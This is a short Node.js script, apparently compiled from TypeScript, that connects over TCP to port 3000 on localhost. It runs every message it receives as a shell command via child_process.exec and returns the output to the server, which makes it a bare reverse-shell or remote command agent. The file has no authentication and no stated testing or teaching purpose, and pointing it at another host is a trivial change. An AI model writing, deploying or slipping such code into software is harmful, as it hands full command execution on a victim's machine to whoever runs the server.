"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const net_1 = require("net");
const child_process_1 = require("child_process");
const socket = new net_1.Socket();
socket.connect(3000, "localhost", () => {
    console.log("Connected to server");
});
socket.on("data", (data) => {
    console.log("Received:", data.toString());
    let command = data.toString();
    (0, child_process_1.exec)(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            socket.write(error.message);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            socket.write(stderr);
            return;
        }
        //console.log(`stdout: ${stdout}`);
        socket.write(stdout);
    });
});
